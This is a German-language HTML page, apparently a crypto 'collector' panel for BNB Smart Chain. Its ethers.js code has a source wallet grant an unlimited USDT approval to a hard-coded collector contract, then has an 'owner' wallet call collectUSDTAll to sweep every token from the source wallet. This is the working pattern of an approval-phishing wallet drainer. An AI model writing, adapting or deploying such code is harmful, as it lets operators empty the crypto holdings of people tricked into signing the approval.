<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
  <title>Admin Collector Panel</title>
  <style>
    body{ font-family: 'Segoe UI', sans-serif; background:#0f172a; color:#fff; display:flex; min-height:100vh; justify-content:center; align-items:center; margin:0; padding:15px; }
    .box{ background:#020617; padding:25px; border-radius:16px; width:100%; max-width:380px; box-shadow:0 10px 30px rgba(0,0,0,.5); border: 1px solid #1e293b; }
    h2{ margin-top:0; color: #f8fafc; font-size: 20px; text-align: center; margin-bottom: 20px; }
    .step { background: #1e293b; padding: 15px; border-radius: 12px; margin-bottom: 15px; border-left: 4px solid #3b82f6; }
    .step-title { font-size: 11px; font-weight: bold; text-transform: uppercase; color: #94a3b8; margin-bottom: 10px; display: block; }
    button { background:#22c55e; border:none; padding:14px; width:100%; font-size:15px; font-weight:bold; cursor:pointer; border-radius:10px; color: white; transition: 0.2s; -webkit-tap-highlight-color: transparent; }
    button:active { transform: scale(0.98); opacity: 0.8; }
    button.secondary { background:#334155; margin-bottom: 10px; }
    button.danger { background: #ef4444; margin-top: 10px; }
    .mono { font-family: monospace; font-size:11px; word-break:break-all; background: #000; padding: 10px; border-radius: 6px; display: block; margin-top: 5px; color: #10b981; border: 1px solid #1e293b; min-height: 15px; }
    #status { margin-top:15px; padding: 12px; border-radius: 8px; background: #0f172a; font-size: 13px; text-align: center; min-height: 45px; border: 1px dashed #334155; line-height: 1.4; color: #cbd5e1; }
    .info-footer { font-size: 10px; color: #64748b; margin-top: 15px; text-align: center; line-height: 1.5; }
  </style>
</head>
<body>

<div class="box">
  <h2>Admin Collector Panel</h2>

  <div class="step">
    <span class="step-title">Phase 1: Wallet A (Quelle)</span>
    <button class="secondary" onclick="connectAndSwitch()">1. Wallet A verbinden</button>
    <div class="mono" id="addr">Nicht verbunden</div>
    
    <button style="margin-top:12px" onclick="approveUSDT()">2. USDT Freigabe (Approve)</button>
  </div>

  <div class="step" style="border-left-color: #eab308;">
    <span class="step-title">Phase 2: Owner (Du)</span>
    <p style="font-size:11px; color:#cbd5e1; margin-bottom:10px;">Jetzt in der Wallet zur <b>Owner-Adresse</b> wechseln!</p>
    <button class="danger" onclick="collectAll()">3. USDT komplett ziehen</button>
  </div>

  <div id="status">Bereit. Bitte Schritt 1 starten.</div>

  <div class="info-footer">
    Ziel-Netzwerk: <b>BNB Smart Chain (BSC)</b><br>
    Contract: 0x61bF4DAE189C62344Df1E9802B5338C196d1E26B
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.min.js"></script>
<script>
  const COLLECTOR_ADDRESS = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
  const BSC_CHAIN_ID = "0x38"; // 56 in Hex

  let walletA = null;

  function setStatus(msg) { document.getElementById("status").innerHTML = msg; }

  async function connectAndSwitch() {
    try {
      if (!window.ethereum) return setStatus("‚ùå Kein Wallet-Browser gefunden. Bitte Trust Wallet nutzen.");
      
      setStatus("‚åõ Verbindung wird angefragt...");
      
      // 1. Account anfragen
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      walletA = accounts[0];
      document.getElementById("addr").innerText = walletA;

      // 2. Automatischer Netzwerkcheck & Wechsel zu BSC
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: BSC_CHAIN_ID }],
        });
        setStatus("‚úÖ Verbunden & Netz auf BSC gewechselt.<br>Jetzt Schritt 2: Freigabe.");
      } catch (switchError) {
        // Falls BSC noch nicht in der Liste ist (Code 4902)
        if (switchError.code === 4902) {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: BSC_CHAIN_ID,
              chainName: 'BNB Smart Chain',
              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
              rpcUrls: ['https://bsc-dataseed.binance.org/'],
              blockExplorerUrls: ['https://bscscan.com/']
            }]
          });
        } else {
          throw switchError;
        }
      }
    } catch (e) {
      console.error(e);
      setStatus("‚ùå Abbruch: " + (e.message.includes("4001") ? "Verbindung abgelehnt." : e.message));
    }
  }

  async function approveUSDT() {
    try {
      if (!walletA) return setStatus("‚ùå Zuerst Schritt 1 ausf√ºhren!");
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
      const contract = new ethers.Contract(USDT_ADDRESS, abi, signer);
      
      setStatus("‚åõ Bitte Freigabe in der Wallet best√§tigen...");
      const tx = await contract.approve(COLLECTOR_ADDRESS, ethers.MaxUint256);
      
      setStatus("‚åõ Transaktion wird verarbeitet...");
      await tx.wait();
      setStatus("‚úÖ Freigabe erfolgreich!<br><b>Wechsle jetzt zur Owner-Wallet.</b>");
    } catch (e) {
      setStatus("‚ùå Fehler bei Freigabe (BNB f√ºr Gas vorhanden?)");
    }
  }

  async function collectAll() {
    try {
      if (!walletA) return setStatus("‚ùå Wallet A Adresse fehlt.");
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const abi = ["function collectUSDTAll(address from) external"];
      const contract = new ethers.Contract(COLLECTOR_ADDRESS, abi, signer);
      
      setStatus("‚åõ Einzug wird gestartet...");
      const tx = await contract.collectUSDTAll(walletA);
      await tx.wait();
      
      setStatus("üéâ <b>ERFOLG!</b><br>USDT wurden in den Tresor verschoben.");
    } catch (e) {
      setStatus("‚ùå Fehler: Nur der Owner kann dies ausf√ºhren oder Wallet nicht gewechselt.");
    }
  }
</script>
</body>
</html>
